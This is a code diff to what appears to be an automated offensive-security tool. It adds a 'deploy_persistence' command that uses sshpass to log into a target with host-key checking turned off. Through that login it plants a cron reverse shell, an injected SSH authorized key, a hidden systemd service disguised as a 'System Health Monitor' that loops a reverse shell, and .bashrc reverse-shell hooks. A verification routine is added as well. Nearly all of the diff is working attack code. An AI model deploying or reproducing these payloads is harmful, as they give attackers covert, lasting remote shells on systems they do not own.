@@ -81,6 +81,8 @@ interface ToolOptions {
   uploadUrl?: string;
   shellContent?: string;
   filename?: string;
+  method?: string;
+  sshPubKey?: string;
 }
 
 // Common wordlist paths (container may have different paths than host)
@@ -273,6 +275,74 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
     const filename = opts.filename ?? 'shell.php';
     return ['sh', '-c', `echo '${shellContent}' > /tmp/${filename} && curl -s -F "file=@/tmp/${filename}" "${uploadUrl}" && echo "UPLOAD_COMPLETE" && curl -s "${target}/uploads/${filename}?cmd=id" && rm -f /tmp/${filename}`];
   },
+
+  // ── Persistence payloads ──────────────────────────────────────────────
+
+  deploy_persistence: (target, opts) => {
+    const host = extractHost(target);
+    const port = opts.port ?? 22;
+    const user = opts.username ?? 'root';
+    const password = opts.password ?? '';
+    const method = opts.method ?? 'all';
+    const lhost = opts.lhost ?? '10.10.10.1';
+    const lport = opts.lport ?? '4444';
+    const sshPubKey = opts.sshPubKey ?? '';
+    const sshOpts = ['-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port)];
+
+    const commands: string[] = [];
+
+    // Cron reverse shell — beacon every 5 minutes
+    if (method === 'cron' || method === 'all') {
+      commands.push(
+        `echo "=== CRON PERSISTENCE ===" && (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' 2>/dev/null") | sort -u | crontab - && echo "CRON_INSTALLED"`,
+      );
+    }
+
+    // SSH authorized_keys injection
+    if (method === 'ssh_key' || method === 'all') {
+      const key = sshPubKey || 'ssh-ed25519 AAAA_PLACEHOLDER_KEY cstrike@persistence';
+      commands.push(
+        `echo "=== SSH KEY PERSISTENCE ===" && mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "${key}" >> ~/.ssh/authorized_keys && sort -u -o ~/.ssh/authorized_keys ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "SSH_KEY_INSTALLED"`,
+      );
+    }
+
+    // Systemd hidden service — disguised as a health check
+    if (method === 'systemd' || method === 'all') {
+      const unitContent = `[Unit]\\nDescription=System Health Monitor\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 2>/dev/null; sleep 300; done'\\nRestart=always\\nRestartSec=60\\n\\n[Install]\\nWantedBy=multi-user.target`;
+      commands.push(
+        `echo "=== SYSTEMD PERSISTENCE ===" && printf '${unitContent}' > /etc/systemd/system/.health-monitor.service && systemctl daemon-reload && systemctl enable .health-monitor.service 2>/dev/null && systemctl start .health-monitor.service 2>/dev/null && echo "SYSTEMD_INSTALLED"`,
+      );
+    }
+
+    // Bashrc hook — triggers on interactive login
+    if (method === 'bashrc' || method === 'all') {
+      commands.push(
+        `echo "=== BASHRC PERSISTENCE ===" && for f in /root/.bashrc /home/*/.bashrc; do [ -f "$f" ] && grep -q "health-check" "$f" || echo '(bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 &) 2>/dev/null # health-check' >> "$f" && echo "BASHRC_HOOK: $f"; done && echo "BASHRC_INSTALLED"`,
+      );
+    }
+
+    const fullCmd = commands.join(' && ');
+    return ['sshpass', '-p', password, 'ssh', ...sshOpts, `${user}@${host}`, fullCmd];
+  },
+
+  verify_persistence: (target, opts) => {
+    const host = extractHost(target);
+    const port = opts.port ?? 22;
+    const user = opts.username ?? 'root';
+    const password = opts.password ?? '';
+    const sshOpts = ['-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port)];
+
+    const enumCmd = [
+      'echo "=== CRON CHECK ===" && crontab -l 2>/dev/null | grep -c "dev/tcp" && echo "CRON_ACTIVE" || echo "CRON_MISSING"',
+      'echo "=== SSH KEY CHECK ===" && cat ~/.ssh/authorized_keys 2>/dev/null | wc -l && echo "SSH_KEYS_PRESENT" || echo "SSH_KEY_MISSING"',
+      'echo "=== SYSTEMD CHECK ===" && systemctl is-active .health-monitor.service 2>/dev/null && echo "SYSTEMD_ACTIVE" || echo "SYSTEMD_MISSING"',
+      'echo "=== BASHRC CHECK ===" && grep -rl "health-check" /root/.bashrc /home/*/.bashrc 2>/dev/null && echo "BASHRC_ACTIVE" || echo "BASHRC_MISSING"',
+      'echo "=== ACTIVE CONNECTIONS ===" && ss -tnp 2>/dev/null | grep ESTAB | head -10',
+      'echo "=== PERSISTENCE SUMMARY ===" && echo "Verification complete"',
+    ].join(' && ');
+
+    return ['sshpass', '-p', password, 'ssh', ...sshOpts, `${user}@${host}`, enumCmd];
+  },
 };
 
 class ToolExecutor {
@@ -314,6 +384,8 @@ class ToolExecutor {
     ssh_connect: 60_000,   // 1 min — single SSH command
     privesc_check: 120_000, // 2 min — enumeration over SSH
     webshell_upload: 60_000, // 1 min
+    deploy_persistence: 120_000, // 2 min — deploys multiple mechanisms
+    verify_persistence: 60_000,  // 1 min — verification check
   };
 
   /**
